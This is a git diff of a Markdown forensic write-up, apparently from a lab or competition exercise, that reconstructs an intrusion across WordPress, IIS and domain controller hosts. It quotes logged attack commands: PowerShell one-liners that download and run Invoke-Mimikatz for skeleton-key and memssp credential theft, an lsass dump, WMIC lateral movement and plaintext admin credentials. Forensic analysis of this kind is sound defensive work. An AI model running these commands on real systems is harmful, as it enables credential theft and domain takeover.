@@ -1,20 +1,24 @@
-# how attack
+# T5-fornesis
+
+by asef18766(陳兆閔) and YingMuo(彭建霖)
+
+## how attack
 * ubuntu wordpress web server : ```CVE-2019-9978``` to get webshell and ```sqlmap``` to get wropress admin account
 
 * windows IIS server : ```CVE-2020-0688``` (awaiting to determinate) attack and create reverse shell by [powercat](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)
 
 * windows dc server : in IIS server execute ```Sqldumper.exe  468 0 0x01100``` dumps the process with pid ```468```(probably ``` lsass.exe```) and use Minikatz to get dc's admin 's account and password (/user:TEAMT5\Administrator /password:admin12345!!!) and connect by IIS server
 
-# Horizon move
+## Horizon move
 * ubuntu -> IIS : post bt.ext and nt.exe by tunnel
 
 * IIS -> dc : create process ipconfig.exe via ```"c:\windows\system32\cmd.exe" /c wmic /node:192.168.1.4 /user:TEAMT5\Administrator /password:admin12345!!! process call create "ipconfig.exe"```
 
-# timeline
+## timeline
 
 
-# fornesis result
-## windows IIS server
+## fornesis result
+### windows IIS server
 * 2020/8/4 AM 08:42:33 CVE-2020-0688 (awaiting to determinate)
 ```
 c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm127dc09c-653d-45f2-8d87-b91abf5fdbce -h "C:\inetpub\temp\apppools\ASP.NET v4.0\ASP.NET v4.0.config" -w "" -m 0 -t 20
@@ -51,7 +55,7 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 
 * 2020/8/5 PM 10:27:32 ```"c:\windows\system32\cmd.exe" /c net use z: \\WIN-LN8SES7K1Q5\C$ /user:TEAMT5\Administrator mimikatz```
 
-## ubuntu wordpress web server
+### ubuntu wordpress web server
 * 03/Aug/2020:09:38:35, ```CVE-2019-9978``` and post shell, ```bt.exe```, ```nt.exe``` by ```10.20.3.131```
 
 * 04/Aug/2020:08:49:26, start to ```sqlmap``` by ```10.20.2.227```
@@ -70,7 +74,7 @@ c:\windows\system32\inetsrv\w3wp.exe -ap "ASP.NET v4.0" -v "v4.0" -l "webengine4
 
 * 04/Aug/2020:23:07:16, use tunnel request ```http://192.168.1.3/umbraco/bbbb.aspx``` it's webshell
 
-## windows dc server
+### windows dc server
 * 2020/08/04:09:23:44, invoke Mimikatz via ```cmd.exe /Q /c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::skeleton'" 1> \\127.0.0.1\ADMIN$\__1596450222.629457 2>&1``` by ```WIN-LN8SES7K1Q5$```
 
 * 2020/08/04:09:24:46, invoke Mimikatz via ```powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug misc::memssp'" ``` by ``` Administrator ```
